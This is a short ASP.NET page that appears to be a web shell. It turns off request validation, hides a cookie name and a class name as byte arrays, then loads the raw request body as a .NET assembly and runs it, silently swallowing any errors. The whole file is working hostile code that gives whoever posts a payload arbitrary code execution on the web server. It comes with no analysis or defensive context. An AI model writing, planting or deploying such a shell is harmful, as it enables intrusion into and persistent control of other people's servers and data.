<%@ Page Language=C# ValidateRequest=false %>
<% 
    byte[] aaa = { 0x6d, 0x6a, 0x6a };

    string bbb = System.Text.Encoding.ASCII.GetString(aaa);
    byte[] ccc = {0x63};
    string eee = System.Text.Encoding.ASCII.GetString(ccc);
    try { System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[bbb].Value))).CreateInstance(eee, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); }
    catch { }%>